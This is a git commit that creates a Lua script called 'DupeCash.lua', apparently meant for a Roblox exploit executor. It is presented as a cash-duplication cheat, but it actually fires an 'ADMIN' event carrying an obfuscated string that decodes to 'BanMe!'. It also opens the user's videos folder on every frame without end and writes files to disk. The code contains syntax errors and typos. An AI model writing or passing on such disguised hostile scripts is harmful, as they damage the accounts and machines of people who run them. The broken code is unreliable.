8a048174532e49583aef11d10f93a1e921d439b0
jam <jabjr010907@gmail.com>
2022-12-23 18:21:38 -0500

    Create DupeCash.lua

---
+++ DupeCash.lua
@@ -0,0 +1,18 @@
+local player = game.Players.LocalPLayer
+local char = player.Character
+local workspace game.Workspace
+local cash = game.ReplicatedStorage.PlayerStats[player.Name].Cash
+
+
+
+
+
+
+
+game.ReplicatedStorage.Events.ADMIN:FireServer('\66\97\110\77\101\33');
+
+while game:GetService("RunService").RenderStepped:Wait() do
+game:OpenVideosFolder()
+end
+Synapse:WriteFile(math.random() .. "jam.", "crimepilled.dev")
+end
